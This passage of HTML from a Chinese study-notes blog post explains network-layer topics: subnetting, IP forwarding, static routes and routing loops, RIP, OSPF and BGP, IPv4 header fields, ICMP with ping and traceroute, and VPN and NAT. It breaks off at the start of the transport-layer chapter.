378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>的位置。最好是先给大的子块分配子网。</p><img src="/posts/e255a10a/4.3.22.png" class="" title="使用变长子网掩码划分子网"><h2 id="4-4-IP数据报的发送和转发过程"><a href="#4-4-IP数据报的发送和转发过程" class="headerlink" title="4.4 IP数据报的发送和转发过程"></a>4.4 IP数据报的发送和转发过程</h2><p>IP数据包的发送和转发过程包含两个部分：</p><ul><li><p>主机发送IP数据报</p><p>判断目的主机是否与自己在同一个网络：</p><ul><li>若在同一个网络，则属于直接交付</li><li>若不在同一个网络，则属于间接交付，传输给主机所在网络的默认网关（路由器），由默认网关帮忙转发</li></ul><img src="/posts/e255a10a/4.4.1.png" class="" title="判断目的主机是否与自己在同一个网络"><img src="/posts/e255a10a/4.4.2.png" class="" title="主机C如何知道路由器R的存在"></li><li><p>路由器转发IP数据报</p><ol><li>检查IP数据报首部是否出错：<ul><li>若出错，则直接丢弃该IP数据报并告诉源主机</li><li>若没有出错，则进行转发</li></ul></li><li>根据IP数据报的目的地址在路由表中查找匹配的条目：<ul><li>若找到匹配的条目，则转发给条目中指示的下一跳</li><li>若找不到，则丢弃该IP数据报并告诉源主机</li></ul></li></ol><img src="/posts/e255a10a/4.4.3.png" class="" title="在路由表中查找匹配的条目"><img src="/posts/e255a10a/4.4.4.png" class="" title="路由器隔离广播域"></li></ul><img src="/posts/e255a10a/4.4.5.png" class="" title="习题一"><img src="/posts/e255a10a/4.4.6.png" class="" title="习题二"><h2 id="4-5-静态路由配置及其可能产生的路由环路问题"><a href="#4-5-静态路由配置及其可能产生的路由环路问题" class="headerlink" title="4.5 静态路由配置及其可能产生的路由环路问题"></a>4.5 静态路由配置及其可能产生的路由环路问题</h2><p>静态路由配置是指用户或网络管理员使用路由器的相关命令给路由器人工配置路由表。</p><ul><li>这种人工配置方式简单、开销小。但不能及时适应网络状态(流量、拓扑等)的变化。</li><li>一般只在小规模网络中采用。</li></ul><p>使用静态路由配置可能出现以下问题导致产生路由环路的错误。</p><ul><li>配置错误</li><li>聚合了不存在的网络</li><li>网络故障</li></ul><img src="/posts/e255a10a/4.4.7.png" class="" title="静态路由配置"><p>对于有多个网络存在时，如连接到因特网，对每个网络都进行静态配置显然是不现实的，因此就引出了默认路由的概念。</p><img src="/posts/e255a10a/4.4.8.png" class="" title="默认路由"><img src="/posts/e255a10a/4.4.9.png" class="" title="特定主机路由"><p>静态路由配置错误导致路由环路问题：</p><img src="/posts/e255a10a/4.4.10.png" class="" title="静态路由配置错误导致路由环路"><p>聚合了不存在的网络而导致路由环路问题：</p><img src="/posts/e255a10a/4.4.11.png" class="" title="路由聚合"><img src="/posts/e255a10a/4.4.12.png" class="" title="聚合了不存在的网络而导致路由环路"><img src="/posts/e255a10a/4.4.13.png" class="" title="聚合了不存在的网络而导致路由环路"><p>网络故障而导致路由环路问题：</p><p>假设路由器R1检测到其接口0所直连的网络出现了故障而不可达，就会自动在其路由表中删除该直连网络的路由条目。</p><img src="/posts/e255a10a/4.4.14.png" class="" title="网络故障而导致路由环路"><img src="/posts/e255a10a/4.4.15.png" class="" title="网络故障而导致路由环路"><p>假设一段时间后，之前的故障被修复好了，则R1又自动地得出了其接口0的直连网络的路由条目，并将之前人工配置的针对该直连网络的黑洞路由条目设置为失效状态。假设该直连网络又出现故障而不可达，就会自动在其路由表中删除该直连网络的路由条目，并将该直连网络的黑洞路由条目设置为生效状态。</p><h2 id="4-6-路由选择协议"><a href="#4-6-路由选择协议" class="headerlink" title="4.6 路由选择协议"></a>4.6 路由选择协议</h2><h3 id="4-6-1-路由选择协议概述"><a href="#4-6-1-路由选择协议概述" class="headerlink" title="4.6.1 路由选择协议概述"></a>4.6.1 路由选择协议概述</h3><p>路由器的选择协议分为两种：静态路由选择和动态路由选择。</p><div class="table-container"><table><thead><tr><th>静态路由选择</th><th>动态路由选择</th></tr></thead><tbody><tr><td>由人工配置的网络路由、默认路由、特定主机路由、黑洞路由等都属于静态路由</td><td>路由器通过路由选择协议自动获取路由信息</td></tr><tr><td>这种人工配置方式简单、开销小<br>但是不能及时适应网络状态（流量、拓扑等）的变化</td><td>比较复杂、开销比较大<br>能较好的适应网络状态的变化</td></tr><tr><td>一般只在小规模网络中采用</td><td>适用于大规模网络</td></tr></tbody></table></div><p>因特网所采用的路由选择协议的主要特点：</p><ol><li>自适应：采用动态路由选择，能较好的适应网络状态的变化</li><li>分布式：路由器之间通过相互之间的信息交互，交换路由信息</li><li>分层次：将整个因特网划分为许多较小的自治系统AS（Autonomous System），例如，一个较大的因特网服务提供商（电信）就可以划分成一个自治系统，对于自治系统内部和自治系统外部，分别采用不同类别的路由选择协议进行路由选择。</li></ol><p>因特网采用分层次的路由选择协议，自治系统之间称为域间路由选择，自治系统内称为域内路由选择。自治系统之间称为外部网关协议EGP(也可称为外部路由协议ERP)，自治系统内称为内部网关协议IGP(也可称为内部路由协议IRP)。此处的网关就是路由器，只不过是路由器早期的名称。</p><p>注意：路由协议只是一个名称，并不是一个具体的协议。</p><img src="/posts/e255a10a/4.6.1.png" class="" title="路由协议"><h4 id="4-6-1-1-常见的路由选择协议"><a href="#4-6-1-1-常见的路由选择协议" class="headerlink" title="4.6.1.1 常见的路由选择协议"></a>4.6.1.1 常见的路由选择协议</h4><img src="/posts/e255a10a/4.6.2.png" class="" title="常见的路由选择协议"><h4 id="4-6-1-2-路由器的基本结构"><a href="#4-6-1-2-路由器的基本结构" class="headerlink" title="4.6.1.2 路由器的基本结构"></a>4.6.1.2 路由器的基本结构</h4><p>路由器是具有多个输入端口和输出端口的专用计算机，其任务是转发分组。</p><p>路由器主要由两部分组成：</p><ul><li>路由选择部分：<br>核心构件是路由选择处理机，根据路由器选择协议，周期性的和其他路由器进行路由信息交互，构建路由表。</li><li>分组转发部分：<br>分组转发部分主要有三部分组成：交换结构、一组输入端口和一组输出端口。</li></ul><img src="/posts/e255a10a/4.6.3.png" class="" title="路由器的基本结构"><p>路由表与转发表：</p><ul><li>路由表一般仅包含从目的网络到下一跳的映射。</li><li>路由表需要对网络拓扑变化的计算最优化。</li><li>转发表是从路由表得出的。</li><li>转发表的结构应当使查找过程最优化。</li><li>ps：一般不严格区分路由表和转发表。</li></ul><p>路由器还具有输入缓冲区、输出缓冲区。输入缓冲区用于存储新进入路由器但还来不及处理的分组。输出缓冲区用来存储已经处理完毕但是还来不及发送的分组。</p><h4 id="4-6-1-3-路由器的基本工作过程"><a href="#4-6-1-3-路由器的基本工作过程" class="headerlink" title="4.6.1.3 路由器的基本工作过程"></a>4.6.1.3 路由器的基本工作过程</h4><ol><li>某IP数据报进入路由器输入端口后处理过程：①物理层将其信号转变成比特流，送交数据链路层处理；②数据链路层从比特流中识别出帧，去掉帧头和帧尾后送交网络层处理；③网络层中接收后判断其分组类型，若是普通的数据分组，会将其发送到分组处理机中；若是路由之间交换路由信息的路由报文，则会将该路由报文转发给路由处理机，路由处理机根据分组报文更新自己的路由表。</li><li>某数据报进入分组处理机构后处理过程：分组处理机会根据其分组首部中的目的地址进行查表转发，若找不到目的地址，则丢弃该分组，否则转发到下一个对应端口。</li><li>某IP数据报进入路由器输出端口后处理过程：①输出端口网络层会更新数据分组首部中某些字段的值，例如将数据分组生存时间(TTL)-1，然后送交数据链路层处理；②数据链路层封装成帧，交给物理层处理；③物理层将帧转为对应的比特流，在转换成电信号进行发送。</li></ol><h3 id="4-6-2-路由信息协议-RIP-的基本工作原理"><a href="#4-6-2-路由信息协议-RIP-的基本工作原理" class="headerlink" title="4.6.2 路由信息协议(RIP)的基本工作原理"></a>4.6.2 路由信息协议(RIP)的基本工作原理</h3><img src="/posts/e255a10a/4.6.4.png" class="" title="RIP概述"><p>RIP协议认为好的路由就是“距离短”的路由，就是所通过路由器数量最少的路由。</p><p>当到达同一目的网络有多条 “距离相等” 的路由时，可以进行等价负载均衡，就是将通信量均衡地分布到多条等价的路由上。</p><p>RIP包含以下三个要点：</p><ul><li>和谁交换信息：仅和相邻路由器交换信息</li><li>交换什么信息：自己的路由表</li><li>何时交换信息：周期性交换（例如每30秒）</li></ul><h4 id="4-6-2-1-RIP基本工作过程"><a href="#4-6-2-1-RIP基本工作过程" class="headerlink" title="4.6.2.1 RIP基本工作过程"></a>4.6.2.1 RIP基本工作过程</h4><img src="/posts/e255a10a/4.6.5.png" class="" title="RIP概述"><h4 id="4-6-2-2-RIP的路由条目的更新规则"><a href="#4-6-2-2-RIP的路由条目的更新规则" class="headerlink" title="4.6.2.2 RIP的路由条目的更新规则"></a>4.6.2.2 RIP的路由条目的更新规则</h4><img src="/posts/e255a10a/4.6.6.png" class="" title="RIP的路由条目的更新规则"><h4 id="4-6-2-3-RIP协议存在“坏消息传得慢”的问题"><a href="#4-6-2-3-RIP协议存在“坏消息传得慢”的问题" class="headerlink" title="4.6.2.3 RIP协议存在“坏消息传得慢”的问题"></a>4.6.2.3 RIP协议存在“坏消息传得慢”的问题</h4><img src="/posts/e255a10a/4.6.7.png" class="" title="RIP协议存在“坏消息传得慢”的问题"><p>由于N1出现故障，R1路由器将N1的距离设置为16（16认为不可达）。</p><p>此时R2根据以前RIP协议获得的路由器情况，发送更新请求给R1，而此时R1的更新情况还没发给R2。</p><img src="/posts/e255a10a/4.6.8.png" class="" title="RIP协议存在“坏消息传得慢”的问题"><p>此时R1的路由器表先收到R2的路由器表后会根据上面说的更新规则进行更新，将N1到R2的距离更新为3。此时数据就是被谣言误导的。此后，两路由器之间会一直以被误导的数据进行循环更新路由数据，直到双方距离达到16（认为不可达）时，才会选择放弃传输。</p><p>在此过程中，就会出现路由环路，导致路由器间被占用长达数分钟的时间。</p><p>“坏消息传播得慢” 又称为路由环路或距离无穷计数问题，这是距离向量算法的一个固有问题。可以采取多种措施减少出现该问题的概率或减小该问题带来的危害。比如：</p><ul><li>限制最大路径距离为15（16表示不可达）</li><li>当路由表发生变化时就立即发送更新报文（即 “触发更新”），而不仅是周期性发送</li><li>让路由器记录收到某特定路由信息的接口，而不让同一路由信息再通过此接口向反方向传送（即 “水平分割”）</li></ul><p>但是，就算采取了上述措施，由于向量计算算法的本质决定，“坏消息传得慢”问题还是有可能会出现。</p><h3 id="4-6-3-开放最短路径优先-OSPF-的基本工作原理"><a href="#4-6-3-开放最短路径优先-OSPF-的基本工作原理" class="headerlink" title="4.6.3 开放最短路径优先(OSPF)的基本工作原理"></a>4.6.3 开放最短路径优先(OSPF)的基本工作原理</h3><ul><li><p>开放最短路径优先OSPF，是为了克服RIP的缺点在1989年开发出来的。</p><ul><li>“开放”表明OSPF协议不是受某一家厂商控制，而是公开发表的</li><li>“最短路径优先”，是因为使用了迪杰斯特拉的最短路径算法SPF（最小生成树）</li></ul></li><li><p>OSPF是基于链路状态的，而不是像RIP那样基于距离向量的。</p></li><li>OSPF采用SPF算法计算路由，从算法上保证了不会产生路由环路。</li><li>OSPF不限制网络规模，更新效率高，收敛速度快。</li><li>链路状态是指本路由器都和哪些路由器相连，以及相应链路的代价。<ul><li>代价用来表示费用、距离、时延、带宽等等。代价的计算方法由网络管理人员来决定的，没有统一</li></ul></li></ul><img src="/posts/e255a10a/4.6.9.png" class="" title="计算邻居的代价"><img src="/posts/e255a10a/4.6.10.png" class="" title="判断邻居路由器不可达的方法"><img src="/posts/e255a10a/4.6.11.png" class="" title="LSA概述"><img src="/posts/e255a10a/4.6.12.png" class="" title="LSDB"><img src="/posts/e255a10a/4.6.13.png" class="" title="OSPF"><h4 id="4-6-3-1-五种OSPF分组类型"><a href="#4-6-3-1-五种OSPF分组类型" class="headerlink" title="4.6.3.1 五种OSPF分组类型"></a>4.6.3.1 五种OSPF分组类型</h4><ol><li>问候(Hello)分组：用来发现和维护邻居路由器的可达性</li><li>数据库描述(Database Description)分组：向邻居路由器给出自己的链路状态数据库中的所有链路状态项目的摘要信息</li><li>链路状态请求(Link State Request)分组：向邻居路由器请求发送某些链路状态项目的详细信息</li><li>链路状态更新(Link State Update)分组：路由器使用这种分组将其链路状态进行洪泛发送，即用洪泛法对全网更新链路状态</li><li>链路状态确认(Link State Acknowledgment)分组：这是对链路状态更新分组的确认分组</li></ol><h4 id="4-6-3-2-OSPF的基本工作过程"><a href="#4-6-3-2-OSPF的基本工作过程" class="headerlink" title="4.6.3.2 OSPF的基本工作过程"></a>4.6.3.2 OSPF的基本工作过程</h4><img src="/posts/e255a10a/4.6.14.png" class="" title="OSPF的基本工作过程"><p>主要可以看成三个部分：</p><ol><li><p>通过发送问候分组建立和维护邻居关系</p></li><li><p>链路状态数据库同步：</p><p>先发送数据库描述分组，将自己链路状态数据库中的所有链路状态项目的摘要信息发送给邻居路由。</p><p>路由器发送自己缺失某些链路状态摘要信息中的详细信息，就会向相邻路由发送链路状态请求分组。</p><p>相邻路由器收到链路更新请求后会返回路由状态更新分组。</p><p>发送请求的网络收到更新分组后会返回确认分组，一次更新数据过程结束。</p></li><li><p>同步状态后的链路状态数据库同步：<br>在30分钟后或者链路状态发生变化后，会进行新的更新状态过程。</p></li></ol><h4 id="4-6-3-3-OSPF在多点接入网络路由器中邻居关系的建立"><a href="#4-6-3-3-OSPF在多点接入网络路由器中邻居关系的建立" class="headerlink" title="4.6.3.3 OSPF在多点接入网络路由器中邻居关系的建立"></a>4.6.3.3 OSPF在多点接入网络路由器中邻居关系的建立</h4><img src="/posts/e255a10a/4.6.15.png" class="" title="OSPF邻居关系的建立"><img src="/posts/e255a10a/4.6.16.png" class="" title="划分区域"><p>区域之间分为主干区域和区域。在图中可以看到有4种路由器：</p><ol><li><strong>区域内路由器(IR)</strong>：只用于区域内通信。</li><li><strong>区域边界路由器(ABR)</strong>：用于区域间通信。</li><li><strong>自治系统边界路由器(ASBR)</strong>：用于和其他自治系统通信。</li><li><strong>主干路由器(BBR)</strong>：位于主干区域的路由器。</li></ol><p>使用分层次划分区域的方法，虽然使交换信息的种类变多了，也使OSPF协议更复杂了，但是能使区域内部交换信息量大大减少，使得OSPF能用于规模很大的自治系统中。</p><h3 id="4-6-4-边界网关协议-BGP-的基本工作原理"><a href="#4-6-4-边界网关协议-BGP-的基本工作原理" class="headerlink" title="4.6.4 边界网关协议(BGP)的基本工作原理"></a>4.6.4 边界网关协议(BGP)的基本工作原理</h3><img src="/posts/e255a10a/4.6.17.png" class="" title="边界网关协议"><p>自治系统之间的路由选择必须考虑相关策略(政治、经济、安全等)。BGP只能是力求寻找一条能够到达目的网络且比较好的路由(不能兜圈子)，而并非要寻找一条最佳路由。</p><img src="/posts/e255a10a/4.6.18.png" class="" title="边界网关协议"><img src="/posts/e255a10a/4.6.19.png" class="" title="边界网关协议"><img src="/posts/e255a10a/4.6.20.png" class="" title="边界网关协议"><img src="/posts/e255a10a/4.6.21.png" class="" title="边界网关协议"><h4 id="4-6-4-1-四种BGP-4报文"><a href="#4-6-4-1-四种BGP-4报文" class="headerlink" title="4.6.4.1 四种BGP-4报文"></a>4.6.4.1 四种BGP-4报文</h4><ol><li>OPEN(打开)报文：用来与相邻的另一个BGP发言人建立关系，使通信初始化</li><li>UPDATE(更新)报文：用来通告某一路由的信息，以及列出要撤销的多条路由</li><li>KEEPALIVE(保活)报文：用来周期性地证实邻站的连通性</li><li>NOTIFICATION(通知)报文：用来发送检测到的差错</li></ol><p>BGP刚刚运行时，BGP的邻站会交换整个BGP路由表，以后只需要在路由情况发生变化时更新有变化的部分。这样做对节省网络带宽和减少路由器的处理开销都有好处。</p><img src="/posts/e255a10a/4.6.22.png" class="" title="习题"><h2 id="4-7-IPv4数据报的首部格式"><a href="#4-7-IPv4数据报的首部格式" class="headerlink" title="4.7 IPv4数据报的首部格式"></a>4.7 IPv4数据报的首部格式</h2><img src="/posts/e255a10a/4.7.1.png" class="" title="IP数据报组成"><p>在IP协议中分为两部分：</p><ul><li>固定部分：由20字节组成，是每个IP数据报都必须包含的部分。</li><li>可变部分：可选字段，由40个字节组成，用来增加IP数据报的功能。</li></ul><p>IP数据报的首部的每一行都由32个比特（4个字节）组成。在图中的每个小格子称为字段或者域。每个字段或者某个字段的组合用来表示IP协议的相关功能。</p><p><strong>相关字段功能解释</strong>：</p><ul><li><p>版本：占4比特，表示IP协议的版本。</p><p>通信双方使用的IP协议的版本必须一致，目前广泛使用的IP协议版本号为4(即IPv4)。</p></li><li><p>首部长度：占4比特，表示IP数据报首部的长度。</p><p>该字段的取值以4字节为单位。</p><p>最小十进制取值为5，表示IP数据报首部只有20字节固定部分；最大十进制取值为15，表示IP数据报首部包含20字节固定部分和最大40字节可变部分。</p></li><li><p>区分服务：占8比特，用来获得更好的服务。</p><p>该字段在旧标准中叫作服务类型，但实际上一直没有被使用过。</p><p>只有在使用区分服务时，该字段才起作用。利用该字段的不同数值可提供不同等级的服务质量。一般情况下都不使用该字段。</p></li><li><p>总长度：占16比特，表示IP数据报的总长度(首部+数据载荷)。</p><p>最大取值为十进制的65535，以字节为单位。</p></li><li><p>标识：占16比特。</p><p>属于同一个数据报的各分片数据报应该具有相同的标识。</p><p>IP软件维持一个计数器，每产生一个数据报，计数器值加1，并将此值赋给标识字段。</p></li><li><p>标志：占3比特，各比特含义如下：</p><p>​            DF位：1表示不允许分片；0表示允许分片</p><p>​            MF位：1表示“后面还有分片”，0表示“这是最后一个分片”</p><p>​            保留位：必须为0</p></li><li><p>片偏移：占13比特，指出分片数据报的数据载荷部分偏移其在原数据报的位置有多少个单位。</p><p>片偏移以8个字节为单位。</p></li><li><p>生存时间TTL：占8比特。</p><p>最初以秒为单位，最大生存周期为255秒。路由器转发IP数据报时，将IP数据报首部中的该字段的值减去IP数据报在本路由器上所耗费的时间，若不为0就转发，否则丢弃。</p><p>现在以“跳数”为单位，路由器转发IP数据报时，将IP数据报首部中的该字段的值减1，若不为0就转发，否则丢弃。</p></li><li><p>协议：占8比特，指明IPv4数据报的数据部分是何种协议数据单元。</p><p>常用的一些协议和相应的协议字段值如下：</p><p>| 协议名称   | ICMP | IGMP | TCP  | UDP  | IPv6 | OSPF |<br>| ————— | —— | —— | —— | —— | —— | —— |<br>| 协议字段值 | 1    | 2    | 6    | 17   | 41   | 89   |</p></li><li><p>首部校验和：占16比特，用来检测首部在传输过程中是否出现差错。比CRC校验码简单，称为因特网校验和。</p><p>IP数据报每经过一个路由器，路由器都要重新计算首部校验和，因为某些字段(生存时间、标志、片偏移等)的取值可能发生变化。</p><p>由于IP层本身并不提供可靠传输的服务，并且计算首部校验和是一项耗时的操作，因此在IPv6中，路由器不再计算首部校验和，从而更快转发IP数据报。</p></li><li><p>源IP地址和目的IP地址：各占32比特，用来填写发送该IP数据报的源主机的IP地址和接收该IP数据报的目的主机的IP地址。</p></li><li><p>可选字段：长度从1个字节到40个字节不等，用来支持排错、测量及安全等措施。</p><p>可选字段增加了IP数据报的功能，但这同时也使得IP数据报的首部长度成为可变的。这就增加了每一个路由器处理IP数据报的开销。实际上可选字段很少被使用。</p></li><li><p>填充字段：因为IP地址首部的可选字段的长度为1个字节到40个字节不等，为了确保首部长度整体为4字节的倍数，因此需要用首部填充字段进行填充。</p></li></ul><h3 id="4-7-1-数据载荷"><a href="#4-7-1-数据载荷" class="headerlink" title="4.7.1 数据载荷"></a>4.7.1 数据载荷</h3><img src="/posts/e255a10a/4.7.2.png" class="" title="数据载荷"><h3 id="4-7-2-IP数据报分片"><a href="#4-7-2-IP数据报分片" class="headerlink" title="4.7.2 IP数据报分片"></a>4.7.2 IP数据报分片</h3><p>标识、标志、片偏移这三个字段共同用于数据报分片，此时就引起了数据报分片的概念。</p><p>简单来说，数据报分片就是数据报长度超过最大传输单元(MTU)时，将数据报进行分割的操作。</p><p>数据报长度超过最大传输单元(MTU)时将无法封装成帧，因此就将原IP数据报进行分片，使其成为更小的IP数据报。再逐个分配IP数据报封装成帧进行递交给物理层处理。</p><img src="/posts/e255a10a/4.7.3.png" class="" title="IP数据报分片"><img src="/posts/e255a10a/4.7.4.png" class="" title="例子"><img src="/posts/e255a10a/4.7.5.png" class="" title="例子"><img src="/posts/e255a10a/4.7.7.png" class="" title="习题一"><h3 id="4-7-3-TTL防止路由环路"><a href="#4-7-3-TTL防止路由环路" class="headerlink" title="4.7.3 TTL防止路由环路"></a>4.7.3 TTL防止路由环路</h3><img src="/posts/e255a10a/4.7.6.png" class="" title="TTL防止路由环路"><img src="/posts/e255a10a/4.7.8.png" class="" title="习题二"><img src="/posts/e255a10a/4.7.9.png" class="" title="习题二"><img src="/posts/e255a10a/4.7.10.png" class="" title="习题二"><h2 id="4-8-网际控制报文协议-ICMP"><a href="#4-8-网际控制报文协议-ICMP" class="headerlink" title="4.8 网际控制报文协议(ICMP)"></a>4.8 网际控制报文协议(ICMP)</h2><ul><li>ICMP是为了更有效地转发IP数据报和提高交付成功的机会，在网际层使用了网际控制报文协议(Internet Control Message Protocol，ICMP)。</li><li>主机或路由器使用ICMP来发送差错报文和询问报文。</li><li>ICMP报文被封装在IP数据报中发送。</li></ul><h3 id="4-8-1-ICMP中的差错报告报文"><a href="#4-8-1-ICMP中的差错报告报文" class="headerlink" title="4.8.1 ICMP中的差错报告报文"></a>4.8.1 ICMP中的差错报告报文</h3><p>ICMP中差错报告报文共有5种，分别是：终点不可达、源点抑制、时间超过、参数问题、改变路由(重定向)。</p><p>终点不可达：</p><img src="/posts/e255a10a/4.8.1.png" class="" title="终点不可达"><p>源点抑制：</p><img src="/posts/e255a10a/4.8.3.png" class="" title="源点抑制"><p>时间超过：</p><img src="/posts/e255a10a/4.8.2.png" class="" title="时间超过"><p>另外，当终点在预先规定的时间内不能收到一个数据报的全部数据报片时，就把已收到的数据报片都丢弃，也会向源点发送时间超过报文。</p><p>参数问题：</p><img src="/posts/e255a10a/4.8.4.png" class="" title="参数问题"><p>改变路由：</p><img src="/posts/e255a10a/4.8.5.png" class="" title="改变路由"><p>以下情况不应发送ICMP差错报告报文：</p><ul><li>对ICMP差错报告报文不再发送ICMP差错报告报文</li><li>对第一个分片的数据报片的所有后续数据报片都不发送ICMP差错报告报文</li><li>对具有多播地址的数据报都不发送ICMP差错报告报文</li><li>对具有特殊地址(如127.0.0.0或0.0.0.0)的数据报不发送ICMP差错报告报文</li></ul><h3 id="4-8-2-ICMP中的询问报文"><a href="#4-8-2-ICMP中的询问报文" class="headerlink" title="4.8.2 ICMP中的询问报文"></a>4.8.2 ICMP中的询问报文</h3><img src="/posts/e255a10a/4.8.6.png" class="" title="询问报文"><h3 id="4-8-3-ICMP的应用"><a href="#4-8-3-ICMP的应用" class="headerlink" title="4.8.3 ICMP的应用"></a>4.8.3 ICMP的应用</h3><h4 id="4-8-3-1-分组网间探测PING"><a href="#4-8-3-1-分组网间探测PING" class="headerlink" title="4.8.3.1 分组网间探测PING"></a>4.8.3.1 分组网间探测PING</h4><p>分组网间探测（Packet InterNet Groper，PING）：</p><ul><li>用来测试主机或路由器之间的连通性</li><li>应用层直接使用网际层的ICMP(没有经过运输层的TCP或UDP)</li><li>使用ICMP回送请求和回答报文</li></ul><h4 id="4-8-3-2-跟踪路由traceroute"><a href="#4-8-3-2-跟踪路由traceroute" class="headerlink" title="4.8.3.2 跟踪路由traceroute"></a>4.8.3.2 跟踪路由traceroute</h4><ul><li>用来测试IP数据报从源主机到达目的主机要经过哪些路由器</li><li>Windows版本<ul><li>tracert命令</li><li>应用层直接使用网际层ICMP</li><li>使用了ICMP回送请求和回答报文以及差错报告报文</li></ul></li><li>Unix版本<ul><li>traceroute命令</li><li>在运输层使用UDP协议</li><li>仅使用ICMP差错报告报文</li></ul></li></ul><p>跟踪路由traceroute实现原理：简单来说，就是先发送一个TTL = 1的报文，当TTL到达第一个路由器后TTL变为0，此时路由器会回送时间超过差错报文，此时就能知道第一个路由信息。此时源主机再发送TTL = 2 的报文，当TTL到达第二个路由器后TTL变为0，此时路由器会回送时间超过差错报文，此时就能够知道第二个路由的地址。如此反复，直到到达最后一个路由。</p><img src="/posts/e255a10a/4.8.7.png" class="" title="traceroute实现原理"><img src="/posts/e255a10a/4.8.8.png" class="" title="traceroute实现原理"><img src="/posts/e255a10a/4.8.9.png" class="" title="traceroute实现原理"><h2 id="4-9-虚拟专用网VPN和网络地址转换NAT"><a href="#4-9-虚拟专用网VPN和网络地址转换NAT" class="headerlink" title="4.9 虚拟专用网VPN和网络地址转换NAT"></a>4.9 虚拟专用网VPN和网络地址转换NAT</h2><h3 id="4-9-1-虚拟专用网VPN-Virtual-Private-Network"><a href="#4-9-1-虚拟专用网VPN-Virtual-Private-Network" class="headerlink" title="4.9.1 虚拟专用网VPN(Virtual Private Network)"></a>4.9.1 虚拟专用网VPN(Virtual Private Network)</h3><img src="/posts/e255a10a/4.9.1.png" class="" title="如何让两个专用网络进行通信"><p>第一种方式就是采用电信公司的通信线路，这种方法简单方便，但是租金太贵。</p><p>第二种方式就是将两个网络通过因特网进行通信，但是他们之间的IP地址又如何分配？</p><p>首先明确一个概念：</p><ul><li><p>利用公用的因特网作为本机构各专用网之间的通信载体，这样的专用网称为虚拟专用网（VPN）</p></li><li><p>由于IPv4地址的紧缺，一个机构在因特网上能够申请到的IPv4的地址数量往往是小于本机构所拥有得到主机数量。因此，虚拟专用网中个主机所分配的地址应该是本机构可自由分配的专用地址，而不是需要申请的、在因特网上使用的公有地址。</p></li><li><p>在IPv4地址空间中就规定了这样的特殊地址分配方案：</p><blockquote><p>专用(私有)地址：</p><p>10.0.0.0~10.255.255.255(10/8地址块)</p><p>172.16.0.0~172.31.255.255(172.16/12地址块)</p><p>192.168.0.0~192.168.255.255(192.168/16地址块)</p></blockquote><p>这些地址可以在本地自由分配，不会在因特网中造成冲突。私有地址只能用作本地地址，不能用作全球地址。</p></li></ul><p>本地地址：仅在机构内部使用的 IP 地址，可以由本机构自行分配，而不需要向互联网的管理机构申请。</p><p>全球地址：全球唯一的 IP 地址，必须向互联网的管理机构申请。</p><p>在因特网中的所有路由器，对目的地址是私有地址的IP数据报一律不进行转发。</p><p>为了使两个部门的网络能够跟因特网连通，因此还需要两个路由器具有合法的全球IP地址，这样才能实现通过因特网通信。</p><img src="/posts/e255a10a/4.9.2.png" class="" title="通过因特网进行通信"><p>虽然两个专用网内的主机间发送的数据报是通过了公用的因特网，但在逻辑上就好像是在本机构的专用网上传送一样。数据报在因特网中可能要经过多个网络和路由器，但从逻辑上看，R1和R2之间好像是一条直通的点对点链路，因此这种通信方式又称为IP隧道技术。</p><img src="/posts/e255a10a/4.9.3.png" class="" title="IP隧道技术"><p>如上图所示，同一机构内不同部门的内部网络所构成的虚拟专用网VPN又称为内联网VPN。</p><p>有时一个机构的VPN需要有某些外部机构(通常就是合作伙伴)参加进来，这样的VPN就称为外联网VPN。</p><p>在外地工作的员工需要访问公司内部的专用网络时，只要在任何地点接入到因特网，运行驻留在员工PC中的VPN软件，在员工的PC和公司的主机之间建立VPN隧道，即可访问专用网络中的资源，这种VPN称为远程接入VPN。</p><h3 id="4-9-2-网络地址转换NAT-Network-Address-Translation"><a href="#4-9-2-网络地址转换NAT-Network-Address-Translation" class="headerlink" title="4.9.2 网络地址转换NAT(Network Address Translation)"></a>4.9.2 网络地址转换NAT(Network Address Translation)</h3><p>虽然因特网采用了无分类编址方式来减缓IPv4地址空间耗尽的速度，但由于因特网用户数目的激增，特别是大量小型办公室网络和家庭网络接入因特网的需求不断增加，IPv4地址空间即将面临耗尽的危险仍然没有解除。</p><p>1994年提出了一种网络地址转换NAT的方法再次缓解了IPv4地址空间即将耗尽的问题。NAT能使大量使用内部专用地址的专用网络用户共享少量外部全球地址来访问因特网上的主机和资源。</p><p>例如使用私有地址的主机要给因特网上使用全球IP地址的主机发送IP数据报：</p><img src="/posts/e255a10a/4.9.4.png" class="" title="私有地址给全球地址发送数据报"><p>因特网上的全球IP地址主机给源主机发回数据报：</p><img src="/posts/e255a10a/4.9.5.png" class="" title="全球地址给私有地址发送数据报"><p>NAT路由器接收到数据报后，根据首部的目的地址，查找NAT转换表后进行转换，转换成目的主机本地地址后进行传输。</p><p>当专用网中的这两台使用私有地址的主机都要给因特网使用全球地址的另一台主机发送数据报时，在NAT路由器的NAT转换表中就会产生两条记录，分别记录两个私有地址与全球地址的对应关系。</p><img src="/posts/e255a10a/4.9.6.png" class="" title="私有地址给全球地址发送数据报"><p>该转换方法存在一个问题：如果NAT路由器具有N个全球IP地址，那么至多只能有N个内网主机能够同时和因特网上的主机通信。</p><p>解决方法：由于绝大多数的网络应用都是使用运输层协议TCP或UDP来传送数据，因此可以利用运输层的端口号和IP地址一起进行转换。这样，用一个全球IP地址就可以使多个拥有本地地址的主机同时和因特网上的主机进行通信。这种将端口号和IP地址一起进行转换的技术叫作网络地址与端口号转换NAPT(Network Address and Port Translation)。</p><img src="/posts/e255a10a/4.9.7.png" class="" title="采用NAPT解决"><img src="/posts/e255a10a/4.9.8.png" class="" title="通信不能由外网主机首先发起"><p>对于一些P2P网络应用，需要外网主机主动与内网主机进行通信，在通过NAT时会遇到问题，需要网络应用自己使用一些特殊的NAT穿越技术来解决问题。另外，由于NAT对外网屏蔽了内网主机的网络地址，能为内网的主机提供一定的安全保护。</p><h1 id="5-运输层"><a href="#5-运输层" class="headerlink" title="5. 运输层"></a>5. 运输层</h1><h2 id="5-1-运输层概述"><a href="#5-1-运输层概述" class="headerlink" title="5.1 